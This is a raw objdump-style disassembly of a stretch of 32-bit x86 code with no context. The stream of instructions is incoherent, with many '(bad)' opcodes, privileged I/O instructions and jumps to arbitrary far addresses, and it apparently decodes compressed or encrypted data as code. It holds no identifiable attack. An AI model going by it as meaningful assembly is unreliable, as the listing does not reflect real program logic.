  40d2e8:	or     DWORD PTR [edx-0xb],0x24eef120
  40d2ef:	push   eax
  40d2f0:	aaa    
  40d2f1:	out    dx,eax
  40d2f2:	sbb    BYTE PTR [ebx-0x7e],ah
  40d2f5:	outs   dx,DWORD PTR ds:[esi]
  40d2f6:	mov    dh,0xb7
  40d2f8:	pop    ss
  40d2f9:	fistp  DWORD PTR [esi]
  40d2fb:	mov    edx,0xb3f4dad5
  40d300:	fdivr  st,st(0)
  40d302:	mov    ebp,0xc1a87d69
  40d307:	mov    es,WORD PTR [ecx]
  40d309:	retf   0x242a
  40d30c:	enter  0x342,0x1d
  40d310:	fistp  QWORD PTR [esi]
  40d312:	inc    eax
  40d313:	adc    cl,al
  40d315:	and    eax,ecx
  40d317:	jno    0x40d2c9
  40d319:	loop   0x40d332
  40d31b:	cmp    DWORD PTR [ebp+edi*8+0x9],ebp
  40d31f:	cmp    eax,0x39861fac
  40d324:	or     DWORD PTR [ecx-0x29],ebp
  40d327:	stos   DWORD PTR es:[edi],eax
  40d328:	(bad)  
  40d329:	addr16 jnp 0x40d32d
  40d32c:	int    0xd5
  40d32e:	shl    edi,cl
  40d330:	movntq QWORD PTR [ebx],mm2
  40d333:	or     edi,eax
  40d335:	xchg   edx,eax
  40d336:	pop    es
  40d337:	or     eax,DWORD PTR [eax+ebp*4-0x63820d0e]
  40d33e:	out    0x56,eax
  40d340:	jo     0x40d338
  40d342:	add    eax,0x27fcf502
  40d347:	and    BYTE PTR [esi+0xc],0xcd
  40d34b:	push   ebp
  40d34d:	pop    ebp
  40d34e:	mov    edi,0xe9c17fcb
  40d353:	dec    ecx
  40d354:	gs fadd st(7),st
  40d357:	jmp    0x40d325
  40d359:	jp     0x40d2ff
  40d35b:	mov    cl,0xd8
  40d35d:	pop    esi
  40d35e:	jb     0x40d31a
  40d360:	push   es
  40d361:	lods   eax,DWORD PTR ds:[esi]
  40d362:	or     eax,0xec4a642d
  40d367:	cmp    bh,BYTE PTR [edi-0x1f]
  40d36a:	mov    ebx,edi
  40d36c:	das    
  40d36d:	cmp    ebp,DWORD PTR [eax-0x3c]
  40d370:	(bad)  
  40d371:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d372:	push   ds
  40d373:	call   0xdca0a6a5
  40d378:	or     eax,edx
  40d37a:	and    BYTE PTR [esi+0x2e079e92],bh
  40d380:	mov    edx,0xdcc6d4d0
  40d385:	mov    ds:0x69db8698,eax
  40d38a:	pop    edi
  40d38b:	ja     0x40d335
  40d38d:	shr    DWORD PTR [ebp*8+0x5a2e4570],cl
  40d394:	scas   eax,DWORD PTR es:[edi]
  40d395:	fisttp QWORD PTR [esi+0x16a4d263]
  40d39b:	sbb    eax,0x6e723376
  40d3a0:	mov    bh,0x96
  40d3a2:	js     0x40d376
  40d3a4:	mov    edx,0xc34b5506
  40d3a9:	jb     0x40d338
  40d3ab:	sti    
  40d3ac:	scas   al,BYTE PTR es:[edi]
  40d3ad:	adc    al,0x30
  40d3af:	sbb    eax,0xfc4c5773
  40d3b4:	inc    edi
  40d3b5:	adc    DWORD PTR [eax],ebp
  40d3b7:	inc    ebx
  40d3b8:	pop    ecx
  40d3b9:	sbb    bh,al
  40d3bb:	fwait
  40d3bc:	push   ebx
  40d3bd:	(bad)  
  40d3be:	imul   esi,edi,0xfb8f24a0
  40d3c4:	jge    0x40d404
  40d3c6:	stos   BYTE PTR es:[edi],al
  40d3c7:	xchg   ebp,eax
  40d3c8:	mov    ecx,0x75db7118
  40d3cd:	jl     0x40d3e0
  40d3cf:	sahf   
  40d3d0:	xchg   edi,eax
  40d3d1:	push   edi
  40d3d2:	lds    ebp,FWORD PTR ds:0x1649ec26
  40d3d8:	sti    
  40d3d9:	mov    ds:0xf50773fb,eax
  40d3de:	pop    ebp
  40d3df:	lock js 0x40d3e8
  40d3e2:	dec    eax
  40d3e3:	mov    cl,0x27
  40d3e5:	inc    eax
  40d3e6:	rcr    BYTE PTR [ebp+0x5b775ec9],cl
  40d3ec:	mov    ds:0x47a33b6c,eax
  40d3f1:	xchg   edx,eax
  40d3f2:	xchg   ebp,eax
  40d3f3:	adc    esp,DWORD PTR [ebp+0x14cb63aa]
  40d3f9:	retf   
  40d3fa:	in     al,dx
  40d3fb:	iret   
  40d3fc:	push   edi
  40d3fd:	leave  
  40d3fe:	push   eax
  40d3ff:	mov    cl,0x6b
  40d401:	call   0x30828178
  40d406:	fild   DWORD PTR [ecx+0x38c83289]
  40d40c:	daa    
  40d40d:	ins    DWORD PTR es:[edi],dx
  40d40e:	inc    esp
  40d40f:	push   ss
  40d410:	sub    al,0x45
  40d412:	push   cs
  40d413:	(bad)  
  40d414:	popf   
  40d415:	jge    0x40d44b
  40d417:	lock icebp 
  40d419:	mov    edx,0x737d9109
  40d41e:	lahf   
  40d41f:	cli    
  40d420:	xor    edx,DWORD PTR [ecx-0xe]
  40d423:	and    al,BYTE PTR [edi+0x69bad01]
  40d429:	fwait
  40d42a:	test   BYTE PTR [esi],bl
  40d42c:	jle    0x40d472
  40d42e:	dec    eax
  40d42f:	std    
  40d430:	push   esp
  40d431:	push   esi
  40d432:	sbb    cl,bl
  40d434:	add    eax,0xc60867f4
  40d439:	and    al,0x92
  40d43b:	xor    DWORD PTR [edi+ebx*2+0x44885255],eax
  40d442:	icebp  
  40d443:	(bad)  
  40d444:	je     0x40d3e0
  40d446:	push   esi
  40d447:	add    ecx,esp
  40d449:	or     al,0xbb
  40d44b:	push   ss
  40d44c:	sub    ebx,DWORD PTR [ebp+ebx*1+0x4c]
  40d450:	inc    eax
  40d451:	jmp    0x40d4cc
  40d453:	xor    BYTE PTR [ebp+0x7790780c],bh
  40d459:	dec    esp
  40d45a:	mov    dl,0xdf
  40d45c:	imul   ebx,DWORD PTR [edi],0xf8a4f22e
  40d462:	sub    ah,BYTE PTR [ebx]
  40d464:	pop    ds
  40d465:	xchg   DWORD PTR [edx],esp
  40d467:	ss sahf 
  40d469:	lds    eax,FWORD PTR [edx+0xf8c1498]
  40d46f:	mov    eax,0x9636691a
  40d474:	mov    ecx,0xd426bcad
  40d479:	adc    al,0xce
  40d47b:	xchg   edx,eax
  40d47c:	jae    0x40d48a
  40d47e:	push   ss
  40d47f:	loop   0x40d4a9
  40d481:	or     BYTE PTR [edi-0x9b833f5],dh
  40d487:	fild   QWORD PTR [ebp-0x7bd275a0]
  40d48d:	mov    ds:0xdf5cbdaf,eax
  40d492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d493:	mov    bl,0xf
  40d495:	or     al,0xf8
  40d497:	int    0x6f
  40d499:	(bad)  
  40d49a:	popf   
  40d49b:	ja     0x40d4fd
  40d49d:	popf   
  40d49e:	jns    0x40d49a
  40d4a0:	dec    ebp
  40d4a1:	push   edx
  40d4a2:	rol    BYTE PTR [esi+0x1f1a7e80],0x56
  40d4a9:	dec    esp
  40d4aa:	(bad)  
  40d4ab:	sti    
  40d4ac:	scas   al,BYTE PTR es:[edi]
  40d4ad:	xor    cl,bl
  40d4af:	mov    ch,0xec
  40d4b1:	in     eax,dx
  40d4b2:	jb     0x40d4c4
  40d4b4:	cmp    ebp,DWORD PTR [eax+0x2b]
  40d4b7:	push   es
  40d4b8:	out    0x5,al
  40d4ba:	dec    ebx
  40d4bb:	cld    
  40d4bc:	jl     0x40d498
  40d4be:	(bad)  [eax-0x2c]
  40d4c1:	jl     0x40d4c8
  40d4c3:	aas    
  40d4c4:	hlt    
  40d4c5:	push   ecx
  40d4c6:	(bad)  
  40d4c8:	push   edx
  40d4c9:	or     eax,0x126cd55c
  40d4ce:	cld    
  40d4cf:	rol    BYTE PTR [esi],1
  40d4d1:	xlat   BYTE PTR ds:[ebx]
  40d4d2:	call   FWORD PTR [esi-0x220c9487]
  40d4d8:	(bad)  
  40d4d9:	sub    eax,0x47d4bb64
  40d4de:	push   ebp
  40d4df:	std    
  40d4e0:	jno    0x40d4dc
  40d4e2:	push   ecx
  40d4e3:	(bad)  
  40d4e4:	mov    esp,DWORD PTR [eax-0x3d]
  40d4e7:	push   0x78b89230
  40d4ec:	pusha  
  40d4ed:	hlt    
  40d4ee:	sar    DWORD PTR [ebp+0x39],0x8
  40d4f2:	mov    eax,ds:0x1333ab34
  40d4f7:	mov    dh,0xbd
  40d4f9:	xor    al,0xa0
  40d4fb:	add    dl,BYTE PTR [ebx+0x67297a4]
  40d501:	xor    DWORD PTR [ebp-0x23f5737f],0x7ad0d1ed
  40d50b:	jno    0x40d494
  40d50d:	add    bl,BYTE PTR ds:0xd0ae4fc8
  40d513:	daa    
  40d514:	nop
  40d515:	test   BYTE PTR [edi+ebp*8+0x34],ch
  40d519:	mov    ds:0x3c271c4e,al
  40d51e:	and    eax,0xa0d387bd
  40d523:	daa    
  40d524:	dec    edx
  40d525:	cld    
  40d526:	(bad)
  40d529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d52a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d52b:	ds sti 
  40d52d:	mov    dl,BYTE PTR [edi+edi*8-0x5d5ba67e]
  40d534:	push   esi
  40d535:	mov    dh,0xad
  40d537:	loop   0x40d4d1
  40d539:	ja     0x40d5b1
  40d53b:	into   
  40d53c:	fadd   st,st(2)
  40d53e:	fidiv  WORD PTR [edi+0x3dc6410d]
  40d544:	jecxz  0x40d589
  40d546:	aaa    
  40d547:	pop    esi
  40d548:	add    cl,BYTE PTR ds:0xdffdbb98
  40d54e:	aad    0xbb
  40d550:	push   0x73
  40d552:	pop    ds
  40d553:	push   ecx
  40d554:	loopne 0x40d53e
  40d556:	xor    dh,al
  40d558:	jbe    0x40d5ae
  40d55a:	sbb    al,0x6a
  40d55c:	fidivr WORD PTR [eax+0x32]
  40d55f:	jno    0x40d582
  40d561:	(bad)  
  40d562:	cmp    al,0x16
  40d564:	and    eax,0xfa925c87
  40d569:	cmp    eax,0xf31996b8
  40d56e:	icebp  
  40d56f:	dec    ebx
  40d570:	lock pop edx
  40d572:	ror    BYTE PTR [ecx],0x34
  40d575:	arpl   ax,sp
  40d577:	jbe    0x40d512
  40d579:	xchg   al,ch
  40d57b:	lds    esp,FWORD PTR [ecx]
  40d57d:	xchg   BYTE PTR [eax+0x43],bl
  40d580:	rcl    DWORD PTR [edx+eiz*8-0x40],cl
  40d584:	mov    eax,0x51718a60
  40d589:	mov    dh,0xcd
  40d58b:	icebp  
  40d58c:	in     eax,0x61
  40d58e:	ds xchg edi,eax
  40d590:	sbb    BYTE PTR [edx+0x78],bl
  40d593:	fdiv   DWORD PTR [esi+0x27]
  40d596:	daa    
  40d597:	mov    BYTE PTR [eax+edx*2],dl
  40d59a:	sbb    eax,0x79da0439
  40d59f:	ins    BYTE PTR es:[edi],dx
  40d5a0:	pop    ecx
  40d5a1:	pop    esi
  40d5a2:	jae    0x40d5b1
  40d5a4:	xchg   esp,eax
  40d5a5:	adc    al,0x12
  40d5a7:	mov    dh,0xf5
  40d5a9:	adc    edx,DWORD PTR [esi+eiz*4]
  40d5ac:	es dec edx
  40d5ae:	sbb    DWORD PTR [eax],eax
  40d5b0:	lock loope 0x40d5f8
  40d5b3:	repnz mov ds:0x98c98cb8,al
  40d5b9:	push   esi
  40d5ba:	mov    DWORD PTR [ebx-0x39769a24],esp
  40d5c0:	xor    al,BYTE PTR [ecx-0x36]
  40d5c3:	sub    eax,DWORD PTR [ebp+0x12b18e]
  40d5c9:	repz dec esi
  40d5cb:	addr16 loope 0x40d5a0
  40d5ce:	push   cs
  40d5cf:	hlt    
  40d5d0:	cmp    DWORD PTR [edi-0x3911ed4a],0x59
  40d5d7:	fnstenv [ecx+ecx*8-0x7c]
  40d5db:	and    dh,BYTE PTR [ebp+0x55928190]
  40d5e1:	jle    0x40d599
  40d5e3:	out    dx,eax
  40d5e4:	test   al,0x21
  40d5e6:	xor    BYTE PTR [edi],al
  40d5e8:	int    0x34
  40d5ea:	scas   eax,DWORD PTR es:[edi]
  40d5eb:	pop    ecx
  40d5ec:	xor    DWORD PTR [edx-0x4edd7d36],0x259c7a18
  40d5f6:	mov    ebx,0xc6650f38
  40d5fb:	sub    BYTE PTR [ebp-0x14],dl
  40d5fe:	out    dx,eax
  40d5ff:	lock std 
  40d601:	call   0x91b9:0x62f73c81
  40d608:	add    BYTE PTR [eax],0xc3
  40d60b:	mov    dh,0x6b
  40d60d:	jno    0x40d64b
  40d60f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d610:	dec    esi
  40d611:	mov    edx,0x735bac43
  40d616:	jb     0x40d647
  40d618:	cmp    DWORD PTR [eax+0x60f8623c],eax
  40d61e:	mov    edi,0x8a41cc21
  40d623:	mov    ah,0x7a
  40d625:	mov    al,BYTE PTR [ecx+eiz*1]
  40d628:	push   edi
  40d629:	clc    
  40d62a:	stc    
  40d62b:	push   0x57
  40d62d:	mov    bh,0x8c
  40d62f:	inc    ecx
  40d630:	push   ebp
  40d631:	loope  0x40d670
  40d633:	mov    eax,DWORD PTR [edi-0x59242e11]
  40d639:	out    0x99,eax
  40d63b:	ja     0x40d685
  40d63d:	or     ecx,DWORD PTR [edx+0x873ab3d]
  40d643:	xchg   edx,eax
  40d644:	jno    0x40d5c9
  40d646:	push   eax
  40d647:	pop    esi
  40d648:	into   
  40d649:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d64a:	jmp    0x246a:0x3b50fd4e
  40d651:	xchg   ebp,eax
  40d652:	mov    ah,0x5f
  40d654:	addr16 add al,0xec
  40d657:	mov    eax,0x4947ad5c
  40d65c:	mov    ah,0x6d
  40d65e:	in     al,0x12
  40d660:	fcom   st(6)
  40d662:	or     ebx,DWORD PTR [esi+0x37]
  40d665:	mov    al,0xa6
  40d667:	stos   DWORD PTR es:[edi],eax
  40d668:	mov    bl,0x6a
  40d66a:	jne    0x40d674
  40d66c:	jne    0x40d632
  40d66e:	add    eax,0xebb65717
  40d673:	ret    0x56a8
  40d676:	pop    ecx
  40d677:	pop    ebx
  40d678:	mov    ecx,0xe2d2207
  40d67d:	ins    DWORD PTR es:[edi],dx
  40d67e:	(bad)  
  40d67f:	jg     0x40d6ec
  40d681:	in     eax,0x13
  40d683:	jle    0x40d6d3
  40d685:	hlt    
  40d686:	call   0xf21e0beb
  40d68b:	or     BYTE PTR [ebp-0x7],0x74
  40d68f:	sti    
  40d690:	push   ss
  40d691:	popf   
  40d692:	ret    0x594e
  40d695:	or     BYTE PTR [edx+0x550ea01e],al
  40d69b:	lock jno 0x40d675
  40d69e:	call   0xd0a990de
  40d6a3:	and    al,0x5e
  40d6a5:	inc    esi
  40d6a6:	and    eax,0x62765285
  40d6ab:	xchg   ebx,eax
  40d6ac:	push   ebp
  40d6ad:	lods   al,BYTE PTR ds:[esi]
  40d6ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6af:	cmc    
  40d6b0:	std    
  40d6b1:	ffreep st(2)
  40d6b3:	pop    ds
  40d6b4:	mov    dh,0x5f
  40d6b6:	sti    
  40d6b7:	push   ss
  40d6b8:	mov    eax,0x3537c95
  40d6bd:	adc    DWORD PTR [edx+ebx*4-0x79],0x287e3487
  40d6c5:	loope  0x40d6a0
  40d6c7:	in     al,dx
  40d6c8:	shr    BYTE PTR [esi-0x34],0x71
  40d6cc:	cmp    BYTE PTR ss:[ebp+0x66],al
  40d6d0:	(bad)  
  40d6d1:	loop   0x40d741
  40d6d3:	adc    eax,0x2769539d
  40d6d8:	nop
  40d6d9:	test   BYTE PTR [edi+esi*1],0x65
  40d6dd:	add    BYTE PTR [ecx+0x7f],0x3e
  40d6e1:	or     eax,0x2fbbb31d
  40d6e6:	repz lds ebp,FWORD PTR [esi]
  40d6e9:	jle    0x40d690
  40d6eb:	repz stc 
  40d6ed:	lea    esi,[esi+0x64]
  40d6f0:	add    DWORD PTR [esi],0xe58685f5
  40d6f6:	xchg   ebp,eax
  40d6f7:	je     0x40d6c1
  40d6f9:	mov    WORD PTR [ebx-0x7e],ds
  40d6fc:	add    DWORD PTR [edx-0x5ab45d16],ebx
  40d702:	fcom   DWORD PTR [ebx]
  40d704:	cmp    bh,dl
  40d706:	sbb    bl,ah
  40d708:	fld    TBYTE PTR [edi-0x23]
  40d70b:	ret    0xcfd3
  40d70e:	lods   eax,DWORD PTR ds:[esi]
  40d70f:	cmp    ch,BYTE PTR [ecx+0x56d2189d]
  40d715:	bound  edx,QWORD PTR [ebx+0x25eb290f]
  40d71b:	sbb    edi,esi
  40d71d:	icebp  
  40d71e:	sub    ch,ah
  40d720:	cmp    ecx,DWORD PTR [esi]
  40d722:	sbb    al,0x1c
  40d724:	cmp    DWORD PTR [esi+0x24],ebp
  40d727:	dec    edx
  40d728:	or     DWORD PTR [esi-0xd5670bc],esp
  40d72e:	and    eax,0x47066911
  40d733:	adc    dl,BYTE PTR [esi-0x1ebe3f75]
  40d739:	xchg   eax,esi
  40d73b:	jecxz  0x40d702
  40d73d:	ret    
  40d73e:	pop    ebx
  40d73f:	hlt    
  40d740:	pop    edx
  40d741:	cdq    
  40d742:	inc    eax
  40d743:	daa    
  40d744:	fimul  DWORD PTR ds:0xed875388
  40d74a:	inc    edi
  40d74b:	sahf   
  40d74c:	imul   ebp,DWORD PTR [eax+0x4a0b7772],0xf
  40d753:	jg     0x40d79a
  40d755:	dec    ebp
  40d756:	adc    al,0x49
  40d758:	(bad)  
  40d75a:	jnp    0x40d7be
  40d75c:	dec    ebp
  40d75d:	push   edi
  40d75e:	jbe    0x40d796
  40d760:	sbb    eax,0x3781a11f
  40d765:	sub    BYTE PTR [edi-0x12],bl
  40d768:	mov    esi,0xa00bff01
  40d76d:	mov    ah,0x36
  40d76f:	retf   0x3b82
  40d772:	xchg   edi,eax
  40d773:	cs (bad) 
  40d775:	jmp    0x6b17:0xd4bfa56a
  40d77c:	jo     0x40d775
  40d77e:	ds pop ebp
  40d780:	ret    0x6738
  40d783:	fnclex 
  40d785:	repnz and DWORD PTR [ebp+ebp*1+0x42],edx
  40d78a:	ret    0x667
  40d78d:	mov    ds,WORD PTR [ecx+eax*2+0x1a1b811c]
  40d794:	sbb    DWORD PTR [edi],eax
  40d796:	das    
  40d797:	cwde   
  40d798:	and    cl,bh
  40d79a:	and    al,0xe
  40d79c:	adc    ah,BYTE PTR [edx+0x25]
  40d79f:	loop   0x40d7f5
  40d7a1:	add    ah,0x15
  40d7a4:	stos   BYTE PTR es:[edi],al
  40d7a5:	gs jmp 0x676a:0x857fdd6c
  40d7ad:	xchg   ebx,eax
  40d7ae:	jo     0x40d804
  40d7b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7b1:	outs   dx,BYTE PTR ds:[esi]
  40d7b2:	mov    dl,0xe5
  40d7b4:	clc    
  40d7b5:	and    BYTE PTR [ebx+0x51453e75],0xe9
  40d7bc:	pop    ds
  40d7bd:	lock sbb DWORD PTR [ebp-0x24],esi
  40d7c1:	push   ebx
  40d7c2:	cmp    DWORD PTR [edi+ecx*2],esi
  40d7c5:	sahf   
  40d7c6:	fstp   TBYTE PTR [edx+eax*8-0x7a]
  40d7ca:	adc    DWORD PTR [edx],esp
  40d7cc:	jns    0x40d84d
  40d7ce:	xor    esp,DWORD PTR [edi]
  40d7d0:	push   es
  40d7d1:	fisttp QWORD PTR [edi+ecx*2-0xfe04107]
  40d7d8:	xor    eax,0xf66df96c
  40d7dd:	jmp    0x90a67901
  40d7e2:	sbb    dl,BYTE PTR [ecx-0x7a]
  40d7e5:	shl    BYTE PTR [esi-0x60],1
  40d7e8:	cmp    edi,DWORD PTR [esi+eiz*8]
  40d7eb:	test   DWORD PTR [eax+eiz*2],ebp
  40d7ee:	sbb    dl,ch
  40d7f0:	xchg   edi,eax
  40d7f1:	daa    
  40d7f2:	or     ecx,DWORD PTR [esi-0xc636f14]
  40d7f8:	jo     0x40d784
  40d7fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7fb:	xchg   ebp,eax
  40d7fc:	paddb  mm7,QWORD PTR [ebx]
  40d7ff:	test   eax,0xc29a5ac5
  40d804:	sti    
  40d805:	(bad)  
  40d806:	cmp    BYTE PTR [ebx+0x72],bh
  40d809:	or     al,0x65
  40d80b:	mov    esi,0xd57c1843
  40d810:	xchg   BYTE PTR [edi+0x4f58bac6],bl
  40d816:	loop   0x40d816
  40d818:	leave  
  40d819:	sub    BYTE PTR [ecx+0x68882e3c],dh
  40d81f:	(bad)  
  40d821:	cmc    
  40d822:	xchg   DWORD PTR [ebp+0x7b],ebp
  40d825:	out    dx,al
  40d826:	add    DWORD PTR [esi-0xce5192a],eax
  40d82c:	jnp    0x40d897
  40d82e:	in     al,dx
  40d82f:	cdq    
  40d830:	int3   
  40d831:	nop
  40d832:	pop    ds
  40d833:	out    dx,eax
  40d834:	sar    DWORD PTR [ebx+edi*1-0x4ca252a3],0xff
  40d83c:	lock adc BYTE PTR [ebx+ecx*4-0x3b],dl
  40d841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d842:	jmp    0x35de:0x63870276
  40d849:	lods   al,BYTE PTR ds:[esi]
  40d84a:	(bad)  
  40d84b:	cmp    DWORD PTR [edi+ebx*1-0x15ea2a64],ebp
  40d852:	add    al,0xb7
  40d854:	sbb    eax,0x77fd350f
  40d859:	cs sub eax,0xe3f6c33f
  40d85f:	les    eax,FWORD PTR [ebp+0x23]
  40d862:	es leave 
  40d864:	daa    
  40d865:	ins    BYTE PTR es:[edi],dx
  40d866:	sbb    esp,DWORD PTR [edx+0x7b]
  40d869:	lods   eax,DWORD PTR ds:[esi]
  40d86a:	outs   dx,DWORD PTR ds:[esi]
  40d86b:	mov    al,ds:0x421dc068
  40d870:	pop    eax
  40d871:	pop    es
  40d872:	inc    ebx
  40d873:	or     al,0x35
  40d875:	jnp    0x40d82f
  40d877:	call   0x961:0xb36a9af3
  40d87e:	in     eax,dx
  40d87f:	cmp    DWORD PTR [edx-0x564df0d1],0x50
  40d886:	push   esi
  40d887:	ins    BYTE PTR es:[edi],dx
  40d888:	loopne 0x40d846
  40d88a:	es ds mov edi,0x64ceb9e7
  40d891:	xor    dl,BYTE PTR [edi+0x7e]
  40d894:	(bad)  
  40d895:	adc    esi,DWORD PTR [edi]
  40d897:	lds    esp,FWORD PTR ds:0xef533241
  40d89d:	enter  0x9fa0,0xec
  40d8a1:	inc    edx
  40d8a2:	dec    esi
  40d8a3:	arpl   si,bp
  40d8a5:	ror    BYTE PTR [edx],cl
  40d8a7:	pop    ds
  40d8a8:	sub    bl,ah
  40d8aa:	add    cl,dl
  40d8ac:	add    eax,0x62fed430
  40d8b1:	ret    
  40d8b2:	inc    ebp
  40d8b3:	push   edi
  40d8b4:	repnz sbb eax,0x743e180d
  40d8ba:	add    eax,0x7aecd6b6
  40d8bf:	aam    0xd
  40d8c1:	xor    BYTE PTR [ebx-0x68bd7311],0x7
  40d8c8:	pop    eax
  40d8c9:	mov    dl,0x12
  40d8cb:	(bad)  
  40d8cc:	lahf   
  40d8cd:	test   al,0x54
  40d8cf:	jae    0x40d945
  40d8d1:	dec    esi
  40d8d2:	xlat   BYTE PTR ds:[ebx]
  40d8d3:	mov    ebx,0xb054c92a
  40d8d8:	ret    0x94b6
  40d8db:	rol    DWORD PTR [edi-0x25],1
  40d8de:	pop    eax
  40d8df:	jb     0x40d891
  40d8e1:	imul   ecx,DWORD PTR [eax+0xc],0x7ebb920d
  40d8e8:	cdq    
  40d8e9:	mov    ds:0x611291e5,al
  40d8ee:	mov    eax,0xdb63524
  40d8f3:	mov    bl,0x3e
  40d8f5:	jns    0x40d900
  40d8f7:	pop    es
  40d8f8:	cmc    
  40d8f9:	xlat   BYTE PTR ds:[ebx]
  40d8fa:	sub    DWORD PTR [esi-0x30],edi
  40d8fd:	mov    ebp,0xe1f268cc
  40d902:	jb     0x40d97a
  40d904:	xchg   ebx,eax
  40d905:	and    dh,BYTE PTR [eax+eax*1-0x595645d0]
  40d90c:	lock aad 0x79
  40d90f:	mov    ecx,0xd453b909
  40d914:	lock mov dh,0x9
  40d917:	cmp    eax,0x50da3677
  40d91c:	mov    eax,0x94bae299
  40d921:	repz jmp 0x106274f6
  40d927:	pop    ebp
  40d928:	adc    al,0x9d
  40d92a:	dec    esi
  40d92b:	push   esi
  40d92c:	(bad)
  40d92f:	adc    eax,0x87bdd0c3
  40d934:	pop    ebp
  40d935:	mov    edx,0xa052d97f
  40d93a:	dec    esp
  40d93b:	mov    eax,DWORD PTR [edx]
  40d93d:	pop    ebx
  40d93e:	retf   0xfbd9
  40d941:	cwde   
  40d942:	cmc    
  40d943:	add    DWORD PTR [edx+0x6f],0xbd9f9edc
  40d94a:	xor    BYTE PTR [ebp+0x75],ah
  40d94d:	cmp    esp,0xffffffaa
  40d950:	sbb    BYTE PTR [esi],dl
  40d952:	pop    es
  40d953:	push   esp
  40d954:	jmp    0x74877033
  40d959:	aam    0xd9
  40d95b:	clc    
  40d95c:	pop    esp
  40d95d:	dec    esp
  40d95e:	outs   dx,BYTE PTR ds:[esi]
  40d95f:	adc    BYTE PTR [ecx+edx*2],ah
  40d962:	mov    cl,0xd
  40d964:	dec    esi
  40d965:	mov    edi,0x1b919edd
  40d96a:	push   ebx
  40d96b:	adc    al,0xff
  40d96d:	mov    ebx,0xb6c0e424
  40d972:	rcl    BYTE PTR [eax],1
  40d974:	jno    0x40d999
  40d976:	adc    al,bh
  40d978:	fsub   DWORD PTR [ecx-0x2a6853bb]
  40d97e:	pop    ecx
  40d97f:	sub    BYTE PTR [eax-0x4e02eb07],dh
  40d985:	loopne 0x40d974
  40d987:	sahf   
  40d988:	outs   dx,BYTE PTR ds:[esi]
  40d989:	std    
  40d98a:	adc    dh,BYTE PTR [ecx+0x2a]
  40d98d:	push   0x5b775f52
  40d992:	mov    eax,ds:0xa3e7ee0a
  40d997:	aaa    
  40d998:	retf   
  40d999:	push   ebx
  40d99a:	popf   
  40d99b:	pop    esp
  40d99c:	push   es
  40d99d:	push   edi
  40d99e:	xor    eax,0xe1c7183c
  40d9a3:	(bad)  
  40d9a4:	adc    DWORD PTR [esi-0x60709fd6],esp
  40d9aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9ab:	es fcom st(0)
  40d9ae:	in     eax,dx
  40d9af:	inc    edx
  40d9b0:	adc    edx,eax
  40d9b2:	mov    edx,0xcda7474c
  40d9b7:	sahf   
  40d9b8:	cwde   
  40d9b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9ba:	xchg   esi,eax
  40d9bb:	xchg   BYTE PTR [ecx+0x194533b3],bl
  40d9c1:	push   ss
  40d9c2:	ficom  DWORD PTR [esi]
  40d9c4:	push   cs
  40d9c5:	sub    dh,BYTE PTR [ebx-0x192e5682]
  40d9cb:	push   edi
  40d9cc:	daa    
  40d9cd:	push   eax
  40d9ce:	xor    edx,esi
  40d9d0:	fnstcw WORD PTR [ecx]
  40d9d2:	es mov edi,0xa99d7ec9
  40d9d8:	xor    BYTE PTR [esi-0x40],dl
  40d9db:	cmp    al,0x7a
  40d9dd:	enter  0x43b6,0xfa
  40d9e1:	das    
  40d9e2:	jle    0x40d968
  40d9e4:	data16 adc BYTE PTR [esi],bl
  40d9e7:	jmp    0xde6525f4
  40d9ec:	mov    ebp,0xb7de48f7
  40d9f1:	xor    al,0x62
  40d9f3:	std    
  40d9f4:	adc    ch,cl
  40d9f6:	xor    ah,cl
  40d9f8:	jecxz  0x40d9c9
  40d9fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9fb:	jo     0x40d9fe
  40d9fd:	dec    edx
  40d9fe:	jo     0x40da28
  40da00:	test   BYTE PTR [ebx],0x7d
  40da03:	or     al,0xe
  40da05:	in     eax,0xce
  40da07:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40da09:	pushf  
  40da0a:	rcr    BYTE PTR [ebp+0x75],1
  40da0d:	adc    edi,eax
  40da0f:	pop    ebx
  40da10:	arpl   bx,bx
  40da12:	jp     0x40da31
  40da14:	jge    0x40d9c7
  40da16:	aaa    
  40da17:	sar    ch,0xa4
  40da1a:	pop    ss
  40da1b:	rcl    DWORD PTR [edx],0xb2
  40da1e:	(bad)  
  40da1f:	in     al,dx
  40da20:	int    0x22
  40da22:	cmp    BYTE PTR [esi+0x3dd36600],cl
  40da28:	jmp    0x1efce34f
  40da2d:	mul    cl
  40da2f:	fxch   st(5)
  40da31:	pop    esi
  40da32:	cmp    esp,DWORD PTR [esi]
  40da34:	mov    ds:0xae51ffd8,eax
  40da39:	xor    ebp,esi
  40da3b:	aaa    
  40da3c:	(bad)  
  40da3d:	js     0x40da6e
  40da3f:	and    eax,0xc7561367
  40da44:	adc    eax,0xf0743257
  40da49:	ins    DWORD PTR es:[edi],dx
  40da4a:	mov    al,ds:0x58a1f19e
  40da4f:	and    BYTE PTR [ecx+0x34646475],bh
  40da55:	(bad)  
  40da56:	jnp    0x40da10
  40da58:	pusha  
  40da59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da5a:	leave  
  40da5b:	daa    
  40da5c:	adc    esi,DWORD PTR [ecx-0x36]
  40da5f:	push   ecx
  40da60:	and    esi,DWORD PTR [eax-0x6b9b47d6]
  40da66:	jle    0x40da98
  40da68:	rol    BYTE PTR [edx],cl
  40da6a:	stos   BYTE PTR es:[edi],al
  40da6b:	test   ah,0x9f
  40da6e:	(bad)  
  40da6f:	pop    edx
  40da70:	movnti DWORD PTR [ecx],ebp
  40da73:	(bad)  
  40da75:	xchg   esp,eax
  40da76:	pop    ds
  40da77:	lea    ebp,[esi-0x73]
  40da7a:	jo     0x40da27
  40da7c:	jle    0x40da7e
